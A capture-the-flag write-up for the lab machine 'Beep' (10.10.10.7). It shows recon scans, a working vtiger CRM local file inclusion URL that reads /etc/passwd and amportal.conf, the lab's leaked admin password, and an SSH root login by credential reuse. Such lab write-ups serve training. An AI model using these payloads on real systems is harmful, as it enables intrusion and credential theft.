### IP
`10.10.10.7`


# Recon

### nmap
`nmap -sC -sV -oN 10.10.10.7Beep.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-26 02:05 EST
Nmap scan report for 10.10.10.7
Host is up (0.048s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: RESP-CODES LOGIN-DELAY(0) UIDL TOP AUTH-RESP-CODE APOP USER EXPIRE(NEVER) STLS IMPLEMENTATION(Cyrus POP3 server v2) PIPELINING
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed OK ID THREAD=ORDEREDSUBJECT SORT=MODSEQ BINARY NO UNSELECT CHILDREN ACL UIDPLUS MAILBOX-REFERRALS LIST-SUBSCRIBED CONDSTORE LISTEXT IDLE CATENATE LITERAL+ MULTIAPPEND QUOTA NAMESPACE THREAD=REFERENCES STARTTLS RIGHTS=kxte URLAUTHA0001 RENAME SORT ANNOTATEMORE X-NETSCAPE IMAP4 ATOMIC IMAP4rev1
443/tcp   open  ssl/https?
|_ssl-date: 2020-11-26T08:12:06+00:00; +1h03m27s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 1h03m26s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 358.91 seconds
```
* port 22 ssh
* port 25 smtpd (mail)
* port 80 (http website)
	* We can see that it's running Apache 2.2.3 on CentOS
* port 110 pop3 (mail)
* port 111 rpc
* port 143 imap (mail)
* port 443 (https website)
	* This takes us to an "elastix" login portal
* port 993 imap (mail)
* port 995 pop3 (mail)
* port 3306 mysql
* port 4445 ([trojan?](https://www.adminsub.net/tcp-udp-port-finder/upnotifyp))
* port 10000 MiniServ server manager

* Okay so there's a whole lot of stuff here. 
	* Mainly looks like a server and a mail manager

### gobuster
`gobuster dir -u https://10.10.10.7 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,txt,sh,sql,xml -t 100 --timeout 20s -o gobusterScan.txt`
* There's a lot of stuff going on, so I decided to be pretty thorough with this scan
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.7
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,sh,sql,xml
[+] Timeout:        20s
===============================================================
2020/11/26 15:54:51 Starting gobuster
===============================================================
/register.php (Status: 200)
/help (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/modules (Status: 301)
/themes (Status: 301)
/mail (Status: 301)
/static (Status: 301)
/admin (Status: 301)
/lang (Status: 301)
/config.php (Status: 200)
/robots.txt (Status: 200)
/var (Status: 301)
/panel (Status: 301)
/libs (Status: 301)
/recordings (Status: 301)
/configs (Status: 301)
/vtigercrm (Status: 301)
===============================================================
2020/11/26 19:11:02 Finished
===============================================================

```
* `/modules` has loads of directories that look like they could be useful, but clicking on them doesn't return anything
	* It looks like the directories match the tabs on the `/admin` page, so we probably need to be authenticated to view them
* `/mail` gives us a `RoundCube Webmail` login portal
* `/static` looks like the help pages for some IM and fax machine software
* `/admin` asks for the username and password for `FreePBX` admin
	* The page also shows that it's running `FREEPBX 2.8.1.4`
* `/libs/magpierss/CHANGES` shows us that the server is running magpieRSS v0.72
* `/recordings` looks like the login page for a FreePBX voicemail system
* `/vtigercrm` is a vtgier CRM v5.1.0 login page
	* This is vulnerable to local file inclusion
	* POC:  `https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../../../../../../../../etc/passwd%00`

### nikto
`nikto -host 10.10.10.7`
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.7
+ Target Hostname:    10.10.10.7
+ Target Port:        80
+ Start Time:         2020-11-26 02:30:17 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.3 (CentOS)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: https://10.10.10.7/
+ Apache/2.2.3 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ Server may leak inodes via ETags, header found with file /icons/README, inode: 884871, size: 4872, mtime: Thu Jun 24 15:46:08 2010
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8672 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2020-11-26 02:48:47 (GMT-5) (1110 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```


# Exploitation

### 1. Local File Inclusion
* vtigercrm is vulnerable to local file inclusion
* [This](https://www.exploit-db.com/exploits/37637) exploit indicates that we can use this to view the credentials for elastix
	* Looking at `https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../../../../../../../../etc/amportal.conf%00&module=Accounts&action`, we see the following:
```
...
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
...
FOPWEBROOT=/var/www/html/panel
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE
...

```
* The username is `admin` and the password is `jEhdIekWmdjE`






# Notes

* Use SIP Phone and code upload to get reverse shell: https://codemonkeyism.co.uk/htb-beep/
	* This needed a more thorough nmap scan to discover the service
* Credential reuse with ssh to get root shell: `ssh root@10.10.10.7 -oKexAlgorithms=+diffie-hellman-group1-sha1`
* Shellshock on port 1000 with webmin service cgi file
